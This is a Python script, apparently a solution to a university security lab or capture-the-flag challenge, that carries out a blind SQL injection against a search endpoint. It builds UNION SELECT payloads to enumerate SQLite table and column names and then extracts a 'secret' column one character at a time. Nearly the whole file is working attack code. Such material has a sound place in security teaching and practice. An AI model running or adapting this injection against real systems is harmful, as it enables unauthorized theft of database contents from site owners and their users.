import requests

URL = "http://mustard.stt.rnl.tecnico.ulisboa.pt:22262/?search="

def payload(text,i):
    return f"asdfghjkl' UNION SELECT tbl_name, type, NULL FROM 'sqlite_master' WHERE type='table' AND substr(tbl_name,1,{i}) == '{text}'; --"

def column_payload(text,i):
    return f"asdfghjkl' UNION SELECT name, NULL, NULL FROM pragma_table_info('super_s_sof_secrets') WHERE substr(name,1,{i}) == '{text}'; --"    

def column_content_payload(text,i):
    return f"asdfghjkl' UNION SELECT secret, NULL, NULL FROM 'super_s_sof_secrets' WHERE substr(secret,1,{i}) == '{text}'; --"    

def get_matches(r):
    return r.text.split("Found ")[1].split(" ")[0]
    
# Create a session
session = requests.session()
session.get(URL)

# Find values 
def find_name(payload, names):

    alph = "abcdefghijklmnopqrstuvwxyz" + '{' + '}' + '_' + ':' + "ABCDEFGHIJKLMNOPQRSTUVWXYZ" + ' '

    if(len(names) == 0):
        # Find initial letters
        for letter in alph:
            r = session.get(URL + payload(letter,1))
            n = get_matches(r)
            if n != "0":
                print("Found " + n + " with: " + letter)
                names.append(letter)

    # Find the rest of the letters
    while len(names) != 0:
        for name in names:
            for letter in alph:
                r = session.get(URL + payload(name + letter,len(name+letter)))
                n = get_matches(r)
                if n != "0":
                    names.append(name + letter)
                    print("Found " + n + " with: " + name + letter)
            names.remove(name)
                  
        print(names)


# Find table name
#find_name(payload, [])
# Find column name
#find_name(column_payload, [])
# Find column content
find_name(column_content_payload, [])
